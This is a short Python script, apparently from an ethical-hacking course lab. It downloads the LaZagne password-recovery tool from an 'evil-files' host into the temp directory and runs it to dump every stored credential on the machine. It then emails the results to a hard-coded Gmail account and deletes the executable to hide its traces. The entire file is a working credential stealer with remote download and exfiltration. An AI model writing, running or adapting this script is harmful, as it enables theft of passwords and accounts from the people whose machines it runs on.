#!/usr/bin/env python
import requests, subprocess, smtplib, os, tempfile

def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


temp_dierectory = tempfile.gettempdir()
os.chdir(temp_dierectory)
download("http://10.0.2.15/evil-files/lazagne.exe")
result = subprocess.check_output("laZagne.exe all", shell=True)
send_mail("xayukstron@gmail.com", "12345678", result)
os.remove("lazagne.exe")